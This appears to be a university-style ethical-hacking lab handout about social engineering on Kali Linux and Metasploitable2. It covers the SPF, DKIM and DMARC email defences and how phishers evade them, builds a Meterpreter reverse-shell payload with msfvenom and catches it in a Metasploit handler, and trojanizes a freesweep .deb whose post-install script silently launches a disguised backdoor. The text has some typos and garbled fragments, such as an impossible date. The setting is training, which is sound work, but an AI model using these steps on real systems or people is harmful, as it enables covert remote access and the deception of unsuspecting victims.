The social engineering lab is an immersive and hands-on exploration of offensive security techniques, employing the powerful tools installed on Kali Linux and the intentionally vulnerable Metasploitable2 Linux server. In this immersive session, participants will delve into social engineering, a crucial aspect of ethical hacking. Armed with tools such as site cloner, email blast, and the prowess of msvenom for crafting payloads, students will orchestrate a comprehensive social engineering campaign. The exploration extends to the strategic use of payload obfuscation techniques, enhancing participants' understanding of the subtleties involved in evading detection. By the conclusion of this lab, students will not only have honed their technical expertise but also developed a nuanced appreciation for the strategic application of social engineering tactics in the ever-evolving landscape of cybersecurity.

    Part 2 - Email Blast

    1. Let's say we have the cloned credential harvesting site, and it's doing a credible job masquerading as a legitimate site (after addressing issues 1-4 above with reasonable solutions). How do we get victims (e.g., client employees we have explicit written permission to test) to visit our site? Let's send them an email and bait them to click it.

      The Social-Engineer Toolkit has a "Mass Mailer" module where it can send out emails of your own design. Effectively using this module (or any other mass mailing program) is challenging. You would love to generate fake emails from ceo@company.com or tech-support@company.com, but you'll quickly run into the same kinds of technological filtering and restrictions used to inhibit spammers.

      One of these anti-spam technologies is the Sender Policy Framework (SPF).

        ●

      NOTE
        ●

      There are other more detailed SPF options.

       

      IMPORTANT
        ●

    2. Another anti-spam technology is DomainKeys Identified Mail (DKIM).

      Describe DKIM in your own words. (1 paragraph)

    3. The final anti-spam technology is Domain-based Message Authentication, Reporting, and Conformance (DMARC); an anti-spam technology closely related to the first two.

       

      DELIVERABLE

        ●

      Describe DMARC in your own words. (1 paragraph)

       

      NOTE
        ●

      None of these systems are guaranteed. The receiver of an email could choose to disregard these systems and deliver a fraudulent message anyway. Or, more likely, the receiver uses information from these systems as data points in a larger anti-spam system that examines the content of the message, the reputation of the server sending the email, the user history in flagging previous messages as spam, and proprietary trade secrets built on decades of experience, when deciding whether to deliver the message to a user inbox. Even new legitimate senders have significant challenges in reliably delivering emails to @gmail.com, @outlook.com, and other large mail services.

      Because of these challenges, you'll often see phishing attacks from ceo@fakecompany.com, ceo-fakecompany@gmail.com, or ceo@company.fake.com, as those are more likely to be delivered. Of course, if you already have some access to the corporate network after earlier pen testing activities, you could send emails out using the legitimate corporate email server. But that's a chicken and egg problem - oftentimes, you're using social engineering attacks to gain initial access to the network.

    Part 3 - Payloads via msfvenom

    Metasploit includes a tool - msfvenom - that can package exploits into stand-alone executables that a user can be tricked into running via a social engineering attack.

    1. On your Metasploitable2 VM, Create a stand-alone executable payload.

      1. View a list of all available payloads:

        ⬤ ⬤ ⬤ CODE

          # msfvenom
          $ msfvenom

      2. This is a long list, and it's the same list of available payloads that Metasploit normally has available to run after an exploit. This time no exploit are needed, since we're using social engineering to trick the user into running the payload for us.
        To view the list of available output formats, CPU architectures, and platforms run the following commands:

        ⬤ ⬤ ⬤ CODE

          # Formats, Architectures and Platforms
          $ msfvenom --list formats
          $ msfvenom --list archs
          $ msfvenom --list platforms

      3. Make an executable that is will be runnable on our Metasploitable2 VM, Linux host. That would be the .elf file type. Windows would be .exe file type. Pick a payload from the list that works on Linux, and ask msfvenom to package it for you and save it to the /tmp directory with the filename LegitProgram, /tmp/LegitProgram. This payload is hardwired to connect back to the LHOST address, which should be the Kali Linux VM's IP:

        ⬤ ⬤ ⬤ CODE

          # Creating an Executable
          $ msfvenom --arch x86 --format elf --platform linux LHOST=aaa.bbb.ccc.ddd LPORT=4575 > /tmp/LegitProgram

      4. Change to the /tmp directory, and start a simple webserver in Kali Linux to host this LegitProgram binary. We're using this as a way to get the binary on the target machine since we're in control of both sides, but in reality this would be accomplished through some social engineering attack.

        ⬤ ⬤ ⬤ CODE

          # Hosting the Social Engineering Exploit
          $ cd /tmp

          # Built-in Webserver in Python 2
          $ python2 -m SimpleHTTPServer 8888

          # Alternative Built-in Webserver in Python 3
          $ python3 -m http.server 8888

    2. On your Metasploitable2 VM, download the file from the Kali Linux VM webserver:

      ⬤ ⬤ ⬤ CODE

        # Download Exploit
        $ wget aaa.bbb.ccc.dddd:8888/LegitProgram

       

      WARNING
        ●

      If you have to re-run this wget command for any reason and leave the original file in place, the next file will be named LegitProgram.1, LegitProgram.2, etc, as shown in the wget output. You can either delete the older copy before running wget again or make a note of what the most recent file name is.

       

      NOTE
        ●

      At this point, you can CTRL-C on the web server; we don't need it any more.

    3. On your Kali Linux VM

      1. Start Metasploit:

        ⬤ ⬤ ⬤ CODE

          # Start Metasploit
          $ sudo service postgresql start
          $ msfconsole

      2. Use the generic payload handler that provides Metasploit features to exploits run outside of the framework. Configure it for the payload you just downloaded on the target VM, as it needs to know:

        • What payload is incoming.

        • What IP the payload is connecting to.

        • What port the payload is connecting to.

        ⬤ ⬤ ⬤ CODE

          # Start Metasploit
          msf6> use exploit/multi/handler
          msf6> set PAYLOAD linux/x86/meterpreter_reverse_tcp
          msf6> set LHOST aaa.bbb.ccc.ddd
          msf6> set LPORT 4575
          msf6> set ExitOnSession false

      3. Run this service in the background as a job:

        ⬤ ⬤ ⬤ CODE

          # Run in Background
          msf6> exploit -j

    4. On your Metasploitable2 VM, Run the Payload:

      ⬤ ⬤ ⬤ CODE

        # Start Payload as Executable
        $ chmod +x LegitProgram
        $ ./LegitProgram

    5. You should see a notice on your Kali Linux VM,that a new session was opened.

      ⬤ ⬤ ⬤ CODE

        # Session Opened
        [*] Meterpreter session 1 opened (192.168.1.2:4575 -> 192.168.1.4:36473) at 2023-12-77 19:53:42 -0500$ chmod +x LegitProgram
        msf6> sessions --list
        msf6> sessions -i x

        # Where x = num of your original exploit

    Part 4 - Payload Obfuscation

    Rather than coax the user into running a program exclusively a back door (which might make them suspicious), what if the backdoor is bundled with some legitimate program? Let's build a Linux installer package (.deb file) for the minesweeper game "freesweep", but include an extra surprise in the bundle.

    1. On your Kali Linux VM

      1. Download the legitimate .deb file from the package manager. Since we're going to run this on the OLD Metasploitable2 VM (32-bit), let's grab the correct binary out of the Ubuntu archives. That way, the dynamic library dependencies will work out OK.

        ⬤ ⬤ ⬤ CODE

          # Download Legitimate Package
          $ mkdir -p /tmp/working
          $ cd /tmp/working
          $ wget http://old-releases.ubuntu.com/ubuntu/pool/universe/f/freesweep/freesweep_0.88-4.3_i386.deb/span>

      2. Extract the files into that working directory.

        ⬤ ⬤ ⬤ CODE

          # Extract Package
          $ dpkg dpkg -x freesweep_0.88-4.3_i386.deb package

      3. Add a DEBIAN directory to contain the "extra surprise" we are included in this package.

        ⬤ ⬤ ⬤ CODE

          # Add Surprise Directory
          $ mkdir /tmp/working/package/DEBIAN

      4. In the DEBIAN directory, create a new file called control with the following contents:

        ⬤ ⬤ ⬤ CODE

          # Create Control File
          $ nano /tmp/working/package/DEBIAN/control

        ⬤ ⬤ ⬤ CODE

          Package: freesweep
          Version: 0.88-4.3
          Section: Games and Amusement
          Priority: optional
          Architecture: i386
          Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
          Description: a text-based minesweeper
           Freesweep is an implementation of the popular minesweeper game, where
            one tries to find all the mines without igniting any, based on hints given
            by the computer. Unlike most implementations of this game, Freesweep
            works in any visual text display - in Linux console, in an xterm, and in
           most text-based terminals currently in use.

      5. In the DEBIAN directory, create a post-installation script called postinst with the following commands that:

        • Change the permissions of the innocently-named "freesweep_scores" to include the execute flag.

        • Run the innocently named "freesweep_scores."

        • Run the legitimate freesweep program.

        ⬤ ⬤ ⬤ CODE

          #!/bin/sh
          sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /usr/games/freesweep

      6. Make this script executable:

        ⬤ ⬤ ⬤ CODE

          # Make Script Executable
          $ chmod +x /tmp/working/package/DEBIAN/postinst

      7. Now, generate our backdoor program "freesweep_scores":

        ⬤ ⬤ ⬤ CODE

          # Generate Backdoor
          $ msfvenom --payload linux/x86/meterpreter_reverse_tcp --arch x86 --format elf --platform linux LHOST=aaa.bbb.ccc.ddd LPORT=4575 --out /tmp/working/package/usr/games/freesweep_scores

      8. Build the new .deb file with the backdoor program:

        ⬤ ⬤ ⬤ CODE

          # Build Package
          # -Zgzip is needed because Metasploitable2 OS is much older than Kali's, and the package manager doesn't know how to uncompress newer .deb files
          $ cd /tmp/working/package/DEBIAN
          $ dpkg-deb -Zgzip --build /tmp/working/package

      9. Rename the output back into the original freesweep.deb file name (no one suspects a thing!), and move it to /tmp:

        ⬤ ⬤ ⬤ CODE

          # Rename Package
          $ mv /tmp/working/package.deb /tmp/freesweep.deb
          $ cd /tmp

      10. Change to the /tmp directory, and start a simple web server in Kali Linux to host this freesweep.deb binary. We're using this as a way to get the binary on the target machine since we're in control of both sides, but in reality, this would be accomplished through some social engineering attack.

        ⬤ ⬤ ⬤ CODE

          # Hosting the Social Engineering Exploit
          $ cd /tmp

          # Built-in Webserver in Python 2
          $ python2 -m SimpleHTTPServer 8888

          # Alternative Built-in Webserver in Python 3
          $ python3 -m http.server 8888

    2. On your Metasploitable2 VM

      1. Download the freesweep.deb binary from the Kali Linux VM webserver:

        ⬤ ⬤ ⬤ CODE

          # Download Exploit
          $ wget aaa.bbb.ccc.dddd:8888/freesweep.deb

         

        WARNING
          ●

        If you have to re-run this wget command for any reason and leave the original file in place, the next file will be named LegitProgram.1, LegitProgram.2, etc, as shown in the wget output. Either delete the older copy prior to running wget again, or make a note of what the most recent file name is.

      2. Install this super fun game your friend sent you!

        ⬤ ⬤ ⬤ CODE

          # Install Binary
          $ sudo dpkg -i freesweep.deb
